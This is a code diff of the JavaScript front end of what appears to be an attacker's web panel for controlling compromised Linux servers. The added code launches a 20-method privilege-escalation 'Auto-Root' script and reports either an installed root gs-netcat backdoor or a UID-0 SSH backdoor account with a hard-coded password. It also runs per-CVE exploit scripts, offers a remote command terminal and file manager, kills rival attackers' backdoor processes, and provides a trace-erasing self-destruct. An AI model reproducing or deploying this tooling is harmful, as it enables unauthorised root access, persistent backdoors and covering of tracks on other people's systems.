-const hostile=(d.gsockets||[]).filter(g=>!g.type&&g.secret&&g.secret!==myGs&&g.secret!=='hidden');
-if(hostile.length>0){
-$('dash-alert').innerHTML=`<div class="alert"><span class="alert-icon">🚨</span><div class="alert-text"><strong>${hostile.length} HOSTILE GSOCKET${hostile.length>1?'S':''} DETECTED!</strong>Other attackers have backdoor access. <a href="#" onclick="nav('gs');return false" style="color:var(--gold)">View & Kill →</a></div></div>`;
-}
-}catch(e){}
-}
+function startLive(){async function u(){const r=await api('exec',{cmd:"cat /proc/loadavg 2>/dev/null|awk '{print $1}';free 2>/dev/null|awk '/Mem:/{if($2>0)print int($3*100/$2);else print 0}';df / 2>/dev/null|tail -1|awk '{gsub(/%%/,\"\");print $5}'"});const[load,mem,disk]=(r.output||'0\n0\n0').trim().split('\n');$('live-stats').innerHTML=`<div style="margin-bottom:8px"><div style="display:flex;justify-content:space-between;font-size:10px"><span>CPU</span><span>${load}</span></div></div><div style="margin-bottom:8px"><div style="display:flex;justify-content:space-between;font-size:10px"><span>MEM</span><span>${mem}%%</span></div><div class="stat-bar"><i style="width:${mem}%%;background:${mem>80?'var(--red)':'var(--green)'}"></i></div></div><div><div style="display:flex;justify-content:space-between;font-size:10px"><span>DISK</span><span>${disk}%%</span></div><div class="stat-bar"><i style="width:${disk}%%;background:${disk>80?'var(--red)':'var(--green)'}"></i></div></div>`;}u();setInterval(u,5000);setInterval(updateAccessUrls,30000);}
 
-async function scanInit(){
-$('scan-result').innerHTML='<div style="color:var(--text2)">Scanning vulnerabilities...</div>';
-const r=await api('run',{path:'exploits/gate.sh'});
-try{
-const d=JSON.parse(r.output||'{}');
-if(d.exploits?.length){
-let h='<div style="display:flex;flex-wrap:wrap;gap:8px">';
-d.exploits.slice(0,5).forEach(x=>{
-const c=x.rate>=80?'var(--green)':x.rate>=50?'var(--gold)':'var(--red)';
-h+=`<div class="exp-item" onclick="nav('exp')" style="flex:1;min-width:200px"><span class="exp-cve">${x.cve}</span><span class="exp-name">${x.name}</span><span class="exp-rate" style="color:${c}">${x.rate}%%</span><div class="exp-bar"><i style="width:${x.rate}%%;background:${c}"></i></div></div>`;
+async function checkGsAlert(){const r=await api('run',{path:'scripts/gscan.sh'});try{const d=JSON.parse(r.output||'{}');const hostile=(d.gsockets||[]).filter(g=>!g.type&&g.secret&&g.secret!==myGs&&g.secret!=='hidden');if(hostile.length)$('dash-alert').innerHTML=`<div class="alert"><span class="alert-icon">🚨</span><div class="alert-text"><strong>${hostile.length} Hostile GSockets!</strong><a href="#" onclick="nav('gs');return false" style="color:var(--gold)">View →</a></div></div>`;}catch(e){}}
+
+// AUTO-ROOT
+const LPE_METHODS=['Sudo NOPASSWD','SUID Binaries','Writable /etc/passwd','Docker Socket','Capabilities','Kernel Exploit','Cron Jobs','LD_PRELOAD','Redis','Password Reuse','NFS no_root_squash','Writable PATH','D-Bus','LXD/LXC','Systemd','SSH Keys','MySQL UDF','Tmux/Screen','Process Monitor','Final Checks'];
+function initMethodList(){let h='';LPE_METHODS.forEach((m,i)=>{h+=`<div class="method-item" id="method-${i}"><span class="method-name">${i+1}. ${m}</span><span class="method-status" id="mstat-${i}">pending</span></div>`;});$('method-list').innerHTML=h;}
+
+async function runAutoRoot(){
+$('btn-autoroot').disabled=true;$('btn-autoroot').textContent='Running...';
+clear('root-out');$('root-success').style.display='none';$('root-result').innerHTML='';
+initMethodList();
+log('root-out','Starting Auto-Root with 20 LPE methods...','cmd');
+log('root-out','This may take 1-2 minutes...','warn');
+
+// Update method statuses visually as script runs
+let methodIdx=0;
+const interval=setInterval(()=>{if(methodIdx<20){$('mstat-'+methodIdx).textContent='checking';$('mstat-'+methodIdx).className='method-status checking';methodIdx++;}},1500);
+
+const r=await api('run',{path:'scripts/autoroot.sh'});
+clearInterval(interval);
+
+// Parse output
+const lines=(r.output||'').split('\n');
+lines.forEach(l=>{
+if(l.includes('[✓]'))log('root-out',l,'ok');
+else if(l.includes('[✗]'))log('root-out',l,'err');
+else if(l.includes('[!]'))log('root-out',l,'warn');
+else if(l.includes('[*]'))log('root-out',l,'cmd');
+else log('root-out',l,'');
 });
-$('scan-result').innerHTML=h+'</div>';
-}else $('scan-result').innerHTML='<div style="color:var(--text2)">No exploitable vulnerabilities found</div>';
-}catch(e){$('scan-result').innerHTML='<div style="color:var(--red)">Scan error</div>';}
-}
 
-async function loadExp(){
-$('exp-list').innerHTML='<div style="padding:20px;text-align:center;color:var(--text2)">Loading...</div>';
-const r=await api('run',{path:'exploits/gate.sh'});
+// Try to parse JSON result
 try{
-const d=JSON.parse(r.output||'{}');
-let h='';
-(d.exploits||[]).forEach(x=>{
-const c=x.rate>=80?'var(--green)':x.rate>=50?'var(--gold)':'var(--red)';
-h+=`<div class="exp-item" onclick="runExp('${x.cve}')"><span class="exp-cve">${x.cve}</span><span class="exp-name">${x.name}</span><span class="exp-rate" style="color:${c}">${x.rate}%%</span><div class="exp-bar"><i style="width:${x.rate}%%;background:${c}"></i></div></div>`;
+const jsonMatch=r.output.match(/\{"methods":\[.*\]\}/s);
+if(jsonMatch){
+const result=JSON.parse(jsonMatch[0]);
+// Update method statuses
+result.methods?.forEach((m,i)=>{
+if($('mstat-'+i)){$('mstat-'+i).textContent=m.status;$('mstat-'+i).className='method-status '+(m.status==='success'?'success':'failed');}
 });
-$('exp-list').innerHTML=h||'<div style="padding:20px;text-align:center;color:var(--text2)">No exploits available</div>';
-}catch(e){$('exp-list').innerHTML='<div style="padding:20px;color:var(--red)">Error loading exploits</div>';}
+// Show result
+if(result.root_achieved){
+$('root-success').style.display='flex';
+$('root-success-msg').textContent='Connect with: gs-netcat -s '+result.root_secret+' -i';
+$('root-result').innerHTML=`<div class="root-box"><h3>🎉 ROOT ACCESS ACHIEVED!</h3><p style="font-size:11px;color:var(--text)">A root-level GSSocket backdoor has been installed.</p><code onclick="navigator.clipboard.writeText(this.textContent)">gs-netcat -s ${result.root_secret} -i</code></div>`;
+}else if(result.ssh_user){
+$('root-result').innerHTML=`<div class="root-box" style="border-color:rgba(212,160,18,0.3);background:rgba(212,160,18,0.05)"><h3 style="color:var(--gold)">⚠️ SSH Backdoor Created</h3><p style="font-size:11px">User: <strong>${result.ssh_user}</strong> / Password: <strong>r00t3d</strong> (UID 0)</p></div>`;
+}else{
+$('root-result').innerHTML=`<div class="alert"><span class="alert-icon">❌</span><div class="alert-text"><strong>Root Not Achieved</strong>Manual exploitation may be required. Check output for details.</div></div>`;
+}
+}
+}catch(e){console.error('Parse error:',e);}
+
+$('btn-autoroot').disabled=false;$('btn-autoroot').textContent='🚀 Start Auto-Root';
 }
 
-async function runExp(cve){if(!confirm('Execute '+cve+'?'))return;const r=await api('run',{path:'exploits/'+cve+'/run.sh'});alert(r.output||'Completed');loadExp();}
+async function loadExp(){$('exp-list').innerHTML='Loading...';const r=await api('run',{path:'exploits/gate.sh'});try{const d=JSON.parse(r.output||'{}');let h='';(d.exploits||[]).forEach(x=>{const c=x.rate>=80?'var(--green)':'var(--gold)';h+=`<div class="method-item" onclick="runExp('${x.cve}')"><span style="color:var(--gold);width:120px;font-family:'JetBrains Mono'">${x.cve}</span><span class="method-name">${x.name}</span><span style="color:${c}">${x.rate}%%</span></div>`;});$('exp-list').innerHTML=h||'No exploits';}catch(e){$('exp-list').innerHTML='Error';}}
+async function runExp(cve){if(!confirm('Run '+cve+'?'))return;const r=await api('run',{path:'exploits/'+cve+'/run.sh'});alert(r.output||'Done');}
 
 async function rs(path){clear('term-out');log('term-out','$ bash '+path,'cmd');const r=await api('run',{path});(r.output||'').split('\n').forEach(l=>log('term-out',l,'ok'));}
-
-async function termExec(){
-const c=$('term-cmd').value.trim();if(!c)return;
-$('term-cmd').value='';
-log('term-out','$ '+c,'cmd');
-const r=await api('exec',{cmd:c});
-(r.output||'').split('\n').forEach(l=>log('term-out',l,l.toLowerCase().includes('error')||l.toLowerCase().includes('denied')?'err':''));
-}
-
+async function termExec(){const c=$('term-cmd').value.trim();if(!c)return;$('term-cmd').value='';log('term-out','$ '+c,'cmd');const r=await api('exec',{cmd:c});(r.output||'').split('\n').forEach(l=>log('term-out',l,''));}
 async function termExec2(c){clear('term-out');log('term-out','$ '+c,'cmd');const r=await api('exec',{cmd:c});(r.output||'').split('\n').forEach(l=>log('term-out',l,''));nav('term');}
-
-async function loadProc(){clear('proc-out');log('proc-out','$ ps aux --sort=-%%mem','cmd');const r=await api('exec',{cmd:'ps aux --sort=-%mem 2>/dev/null|head -40'});(r.output||'').split('\n').forEach((l,i)=>log('proc-out',l,i===0?'cmd':''));}
-
-async function loadNet(){clear('net-out');log('net-out','$ ss -tulpn','cmd');const r=await api('exec',{cmd:'ss -tulpn 2>/dev/null||netstat -tulpn 2>/dev/null'});(r.output||'').split('\n').forEach(l=>log('net-out',l,''));log('net-out','');log('net-out','$ ip addr','cmd');const r2=await api('exec',{cmd:"ip addr 2>/dev/null|grep -E 'inet |link/'"});(r2.output||'').split('\n').forEach(l=>log('net-out',l,''));}
+async function loadProc(){clear('proc-out');log('proc-out','$ ps aux --sort=-%%mem','cmd');const r=await api('exec',{cmd:'ps aux --sort=-%mem|head -40'});(r.output||'').split('\n').forEach(l=>log('proc-out',l,''));}
 
 // FILE MANAGER
-async function fmLoad(path){
-cwd=path;
-$('fm-path').innerHTML=path.split('/').filter(Boolean).reduce((a,x,i,arr)=>{
-const fp='/'+arr.slice(0,i+1).join('/');
-return a+' / <a href="#" onclick="fmLoad(\''+fp+'\');return false">'+x+'</a>';
-},'<a href="#" onclick="fmLoad(\'/\');return false">~</a>');
-
-const r=await api('files',{path});
-let h='';
-if(path!=='/'){
-const parent=path.split('/').slice(0,-1).join('/')||'/';
-h+=`<div class="fm-item" ondblclick="fmLoad('${parent}')"><div class="fm-icon dir">⬆</div><div class="fm-info"><div class="fm-name">..</div><div class="fm-meta">Parent directory</div></div></div>`;
-}
-const files=(r.files||[]).sort((a,b)=>(b.type==='dir')-(a.type==='dir')||a.name.localeCompare(b.name));
-files.forEach(f=>{
-const fp=path==='/'?'/'+f.name:path+'/'+f.name;
-const isDir=f.type==='dir';
-const ext=f.name.split('.').pop().toLowerCase();
-const icons={sh:'⚡',py:'🐍',js:'📜',json:'📋',txt:'📝',log:'📋',c:'©',h:'©',md:'📖',html:'🌐',css:'🎨',conf:'⚙',gz:'📦',tar:'📦',zip:'📦'};
-const icon=isDir?'📁':(icons[ext]||'📄');
-h+=`<div class="fm-item" ondblclick="${isDir?`fmLoad('${fp}')`:`fmView('${fp}')`}" data-path="${fp}" data-type="${f.type}">
-<div class="fm-icon ${isDir?'dir':''}">${icon}</div>
-<div class="fm-info"><div class="fm-name">${f.name}</div><div class="fm-meta">${f.perm||''} • ${f.size||''} • ${f.mod||''}</div></div>
-</div>`;
-});
-$('fm-list').innerHTML=h||'<div style="padding:40px;text-align:center;color:var(--text2)">Empty directory</div>';
-}
-
-function fmUp(){const parent=cwd.split('/').slice(0,-1).join('/')||'/';fmLoad(parent);}
+async function fmLoad(path){cwd=path;$('fm-path').innerHTML=path.split('/').filter(Boolean).reduce((a,x,i,arr)=>{const fp='/'+arr.slice(0,i+1).join('/');return a+' / <a href="#" onclick="fmLoad(\''+fp+'\');return false">'+x+'</a>';},'<a href="#" onclick="fmLoad(\'/\');return false">~</a>');const r=await api('files',{path});let h='';if(path!=='/'){const pr=path.split('/').slice(0,-1).join('/')||'/';h+=`<div class="fm-item" ondblclick="fmLoad('${pr}')"><div class="fm-icon dir">⬆</div><div class="fm-info"><div class="fm-name">..</div></div></div>`;}(r.files||[]).sort((a,b)=>(b.type==='dir')-(a.type==='dir')||a.name.localeCompare(b.name)).forEach(f=>{const fp=path==='/'?'/'+f.name:path+'/'+f.name;const isDir=f.type==='dir';const ext=f.name.split('.').pop().toLowerCase();const icons={sh:'⚡',py:'🐍',js:'📜',c:'©',h:'©',txt:'📝',log:'📋',conf:'⚙',gz:'📦',tar:'📦',zip:'📦'};h+=`<div class="fm-item" ondblclick="${isDir?`fmLoad('${fp}')`:`fmView('${fp}')`}" oncontextmenu="fmContext(event,'${fp}','${f.type}')"><div class="fm-icon ${isDir?'dir':''}">${isDir?'📁':(icons[ext]||'📄')}</div><div class="fm-info"><div class="fm-name">${f.name}</div><div class="fm-meta">${f.perm||''} • ${f.size||''}</div></div></div>`;});$('fm-list').innerHTML=h||'Empty';}
+function fmUp(){fmLoad(cwd.split('/').slice(0,-1).join('/')||'/');}
 function fmRefresh(){fmLoad(cwd);}
+async function fmView(path){currentFile=path;$('modal-view-title').textContent=path.split('/').pop();const r=await api('read',{path});$('modal-view-content').textContent=r.content||'(empty/binary)';openModal('modal-view');}
+async function fmEdit(path){currentFile=path;$('modal-edit-title').textContent='Edit: '+path.split('/').pop();const r=await api('read',{path});$('modal-edit-content').value=r.content||'';closeModal('modal-view');openModal('modal-edit');}
+async function fmSaveEdit(){await api('write',{path:currentFile,content:$('modal-edit-content').value});closeModal('modal-edit');fmRefresh();}
+function fmNewFile(){$('modal-new-name').value='';$('modal-new-content').value='';openModal('modal-new');}
+function fmNewDir(){const n=prompt('Folder name:');if(n)api('mkdir',{path:cwd+'/'+n}).then(fmRefresh);}
+async function fmSaveNew(){const n=$('modal-new-name').value.trim();if(!n)return;await api('write',{path:cwd+'/'+n,content:$('modal-new-content').value});closeModal('modal-new');fmRefresh();}
+async function fmDelete(path){if(!confirm('Delete '+path+'?'))return;await api('delete',{path});fmRefresh();}
+function fmDownload(path){window.open('/api/download?path='+encodeURIComponent(path));}
+async function fmUpload(files){for(const f of files){const reader=new FileReader();reader.onload=async e=>{await api('write',{path:cwd+'/'+f.name,content:e.target.result});fmRefresh();};reader.readAsText(f);}}
+function fmContext(e,path,type){e.preventDefault();const c=prompt('1=View 2=Edit 3=Download 4=Delete');if(c==='1')fmView(path);else if(c==='2')fmEdit(path);else if(c==='3')fmDownload(path);else if(c==='4')fmDelete(path);}
 
-async function fmView(path){
-currentFile=path;
-$('modal-view-title').textContent=path.split('/').pop();
-$('modal-view-content').textContent='Loading...';
-openModal('modal-view');
-const r=await api('read',{path});
-$('modal-view-content').textContent=r.content||'(empty or binary file)';
-}
+// GSOCKET
+async function gsScan(){$('gs-list').innerHTML='Scanning...';const r=await api('run',{path:'scripts/gscan.sh'});try{const d=JSON.parse(r.output||'{}');const items=d.gsockets||[];const procs=items.filter(g=>!g.type);const hostile=procs.filter(g=>g.secret!==myGs);$('gs-alert').innerHTML=hostile.length?`<div class="alert"><span class="alert-icon">🚨</span><div class="alert-text"><strong>${hostile.length} Hostile!</strong></div><button class="btn btn-sm btn-red" onclick="gsKillAll()">Kill All</button></div>`:'';let h='';procs.forEach(g=>{const mine=g.secret===myGs;h+=`<div class="gs-card ${mine?'mine':'hostile'}"><div class="gs-header"><span class="gs-badge ${mine?'yours':'hostile'}">${mine?'YOURS':'HOSTILE'}</span><span class="gs-secret">${g.secret||'hidden'}</span>${mine?'':`<button class="btn btn-sm btn-red" onclick="gsKill(${g.pid})">Kill</button>`}</div><div class="gs-body"><table><tr><td>PID</td><td>${g.pid}</td></tr><tr><td>User</td><td>${g.user}</td></tr><tr><td>Mode</td><td>${g.mode||'?'}</td></tr></table></div></div>`;});$('gs-list').innerHTML=h||'<div style="padding:20px;text-align:center;color:var(--green)">✓ No hostile gsockets</div>';}catch(e){$('gs-list').innerHTML='Error';}}
+async function gsKill(pid){await api('exec',{cmd:'kill -9 '+pid});gsScan();}
+async function gsKillAll(){const r=await api('run',{path:'scripts/gscan.sh'});try{const d=JSON.parse(r.output||'{}');const pids=(d.gsockets||[]).filter(g=>!g.type&&g.secret!==myGs).map(g=>g.pid).filter(Boolean);if(pids.length){await api('exec',{cmd:'kill -9 '+pids.join(' ')});alert('Killed '+pids.length);}}catch(e){}gsScan();}
 
-async function fmEdit(path){
-currentFile=path;
-$('modal-edit-title').textContent='Edit: '+path.split('/').pop();
-const r=await api('read',{path});
-$('modal-edit-content').value=r.content||'';
-openModal('modal-edit');
-}
-
-async function fmSaveEdit(){
-const content=$('modal-edit-content').value;
-await api('write',{path:currentFile,content});
-closeModal('modal-edit');
-fmRefresh();
-}
-
-function fmNewFile(){
-$('modal-new-title').textContent='New File';
-$('modal-new-name').value='';
-$('modal-new-content').value='';
-$('modal-new-name').dataset.type='file';
-openModal('modal-new');
-}
-
-function fmNewDir(){
-const name=prompt('New folder name:');
-if(name){api('mkdir',{path:cwd+'/'+name}).then(()=>fmRefresh());}
-}
-
-async function fmSaveNew(){
-const name=$('modal-new-name').value.trim();
-const content=$('modal-new-content').value;
-if(!name)return alert('Enter filename');
-await api('write',{path:cwd+'/'+name,content});
-closeModal('modal-new');
-fmRefresh();
-}
-
-async function fmDelete(path){
-if(!confirm('Delete '+path+'?'))return;
-await api('delete',{path});
-fmRefresh();
-}
-
-function fmDownloadCurrent(){
-if(currentFile)window.open('/api/download?path='+encodeURIComponent(currentFile));
-}
-
-async function fmUpload(files){
-if(!files.length)return;
-for(const f of files){
-const reader=new FileReader();
-reader.onload=async(e)=>{
-const content=e.target.result;
-await api('write',{path:cwd+'/'+f.name,content});
-fmRefresh();
-};
-reader.readAsText(f);
-}
-}
-
-// GSOCKET SCANNER
-async function gsScan(){
-$('gs-list').innerHTML='<div style="padding:20px;text-align:center;color:var(--text2)">Deep scanning...</div>';
-const r=await api('run',{path:'scripts/gscan.sh'});
-try{
-const d=JSON.parse(r.output||'{}');
-const items=d.gsockets||[];
-const procs=items.filter(g=>!g.type);
-const files=items.filter(g=>g.type==='file');
-const persist=items.filter(g=>g.type==='cron'||g.type==='systemd');
-const hostile=procs.filter(g=>g.secret!==myGs);
-
-$('gs-alert').innerHTML=hostile.length?`<div class="alert"><span class="alert-icon">🚨</span><div class="alert-text"><strong>${hostile.length} HOSTILE BACKDOOR${hostile.length>1?'S':''}!</strong>Other attackers have access to this system.</div><button class="btn btn-sm btn-red" onclick="gsKillAll()">Kill All</button></div>`:'';
-
-let h='';
-procs.forEach(g=>{
-const mine=g.secret===myGs;
-h+=`<div class="gs-card ${mine?'mine':'hostile'}">
-<div class="gs-header"><span class="gs-badge ${mine?'yours':g.mode||'listener'}">${mine?'YOURS':g.mode||'?'}</span><span class="gs-secret">${g.secret||'hidden'}</span>
-${mine?'':`<button class="btn btn-sm btn-red" onclick="gsKill(${g.pid})">Kill</button>`}</div>
-<div class="gs-body"><table>
-<tr><td>PID</td><td>${g.pid}</td></tr>
-<tr><td>User</td><td>${g.user}</td></tr>
-<tr><td>Started</td><td>${g.start||'?'}</td></tr>
-<tr><td>Parent</td><td>${g.parent||'?'}</td></tr>
-<tr><td>Conns</td><td>${g.conns||0} active</td></tr>
-</table></div></div>`;
-});
-
-if(files.length){
-h+='<div style="margin:16px 0 8px;font-size:10px;color:var(--text2)">📁 Secret Files Found</div>';
-files.forEach(f=>{
-h+=`<div class="gs-card hostile"><div class="gs-header"><span class="gs-badge" style="background:rgba(139,92,246,0.15);color:#8b5cf6">FILE</span><span class="gs-secret">${f.path}</span><button class="btn btn-sm btn-red" onclick="gsDelFile('${f.path}')">Delete</button></div><div class="gs-body">Owner: ${f.owner} • ${f.mtime}<br>Content: ${f.content||'?'}</div></div>`;
-});
-}
-
-if(persist.length){
-h+='<div style="margin:16px 0 8px;font-size:10px;color:var(--text2)">⏰ Persistence Found</div>';
-persist.forEach(p=>{
-h+=`<div class="gs-card hostile"><div class="gs-header"><span class="gs-badge" style="background:rgba(239,68,68,0.2);color:var(--red)">${p.type.toUpperCase()}</span><span style="flex:1;font-size:9px;color:var(--text2)">${(p.content||'').substring(0,80)}...</span></div></div>`;
-});
-}
-
-$('gs-list').innerHTML=h||'<div style="padding:20px;text-align:center;color:var(--green)">✓ No other gsockets detected. You have exclusive access.</div>';
-}catch(e){$('gs-list').innerHTML='<div style="padding:20px;color:var(--red)">Scan error: '+e.message+'</div>';}
-}
-
-async function gsKill(pid){if(!confirm('Kill PID '+pid+'?'))return;await api('exec',{cmd:'kill -9 '+pid});gsScan();}
-
-async function gsKillAll(){
-if(!confirm('Kill ALL hostile gsockets?'))return;
-const r=await api('run',{path:'scripts/gscan.sh'});
-try{
-const d=JSON.parse(r.output||'{}');
-const pids=(d.gsockets||[]).filter(g=>!g.type&&g.secret!==myGs).map(g=>g.pid).filter(Boolean);
-if(pids.length){await api('exec',{cmd:'kill -9 '+pids.join(' ')});alert('Killed '+pids.length+' hostile process(es)');}
-gsScan();
-}catch(e){}
-}
-
-async function gsDelFile(path){if(!confirm('Delete '+path+'?'))return;await api('exec',{cmd:'rm -f "'+path+'"'});gsScan();}
-
-async function pull(){await api('pull');alert('Repository updated');location.reload();}
-async function nuke(){if(!confirm('⚠️ SELF-DESTRUCT?\\nThis will remove all traces!'))return;await api('destruct');document.body.innerHTML='<div style="display:flex;height:100vh;align-items:center;justify-content:center;background:#000;color:var(--red);font-size:24px">💀 DESTROYED</div>';}
-
-// Context menu for file items
-document.addEventListener('contextmenu',e=>{
-const item=e.target.closest('.fm-item');
-if(item&&item.dataset.path){
-e.preventDefault();
-const path=item.dataset.path;
-const type=item.dataset.type;
-const menu=[
-{label:'📖 View',action:()=>fmView(path)},
-{label:'✏️ Edit',action:()=>fmEdit(path)},
-{label:'⬇️ Download',action:()=>window.open('/api/download?path='+encodeURIComponent(path))},
-{label:'🗑️ Delete',action:()=>fmDelete(path),danger:true}
-];
-// Simple context menu via prompt
-const choice=prompt('Actions for '+path.split('/').pop()+':\\n1. View\\n2. Edit\\n3. Download\\n4. Delete');
-if(choice==='1')fmView(path);
-else if(choice==='2')fmEdit(path);
-else if(choice==='3')window.open('/api/download?path='+encodeURIComponent(path));
-else if(choice==='4')fmDelete(path);
-}
-});
+function copyUrl(){const u=$('current-url').textContent;if(u)navigator.clipboard.writeText(u);}
+async function refreshUrl(){const info=await api('info',{});if(info.url){$('current-url').href=info.url;$('current-url').textContent=info.url;}}
+async function pull(){await api('pull');location.reload();}
+async function nuke(){if(!confirm('⚠️ DESTRUCT?'))return;await api('destruct');document.body.innerHTML='<div style="display:flex;height:100vh;align-items:center;justify-content:center;background:#000;color:var(--red);font-size:24px">💀 DESTROYED</div>';}
 
 init();
 </script>
